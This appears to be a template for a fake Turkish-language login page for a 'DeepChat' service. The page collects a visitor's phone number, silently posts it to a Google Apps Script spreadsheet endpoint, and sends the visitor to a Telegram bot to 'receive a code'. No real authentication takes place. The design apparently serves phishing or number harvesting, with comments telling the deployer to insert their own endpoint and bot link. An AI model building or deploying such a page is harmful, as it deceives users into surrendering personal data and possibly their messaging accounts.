<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeepChat | Giriş Yap</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1e293b; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; width: 320px; }
        h2 { color: #38bdf8; margin-bottom: 1.5rem; }
        input { width: 100%; padding: 12px; margin-bottom: 1rem; border: none; border-radius: 8px; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #38bdf8; border: none; border-radius: 8px; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #0ea5e9; }
        .info { font-size: 0.8rem; color: #94a3b8; margin-top: 1rem; }
    </style>
</head>
<body>

<div class="container">
    <h2>DeepChat</h2>
    <p>Giriş yapmak için numaranızı girin.</p>
    <input type="tel" id="phoneInput" placeholder="Örn: 05551234567" required>
    <button onclick="gonderVeYonlendir()">Kod Al</button>
    <div class="info">Kodunuz Telegram üzerinden gönderilecektir.</div>
</div>

<script>
async function gonderVeYonlendir() {
    const telefon = document.getElementById('phoneInput').value;
    // SENİN YENİ EXEC LİNKİN BURAYA GELECEK:
    const scriptURL = "https://script.google.com/macros/s/AKfycbwM22GVVbUXY_9uHRK1Cpe3hsnV1NsxOUn6ENA4wZHsj_KKca8HO6vpQOjg3efqJKH-/exec";

    if (telefon.length < 10) {
        alert("Lütfen geçerli bir numara girin!");
        return;
    }

    try {
        // Veriyi Google Tablo'ya gönderiyoruz
        await fetch(scriptURL, {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-cache',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ numara: telefon })
        });

        alert("Talebiniz alındı! Şimdi Telegram botuna gidip numaranızı yazarak kodunuzu alabilirsiniz.");
        
        // Kullanıcıyı Telegram botuna yönlendiriyoruz (Kendi bot linkini yaz)
        window.location.href = "https://t.me/DeepChattBot"; 

    } catch (error) {
        console.error('Hata:', error);
        alert("Bir sorun oluştu. Lütfen tekrar deneyin.");
    }
}
</script>

</body>
</html>
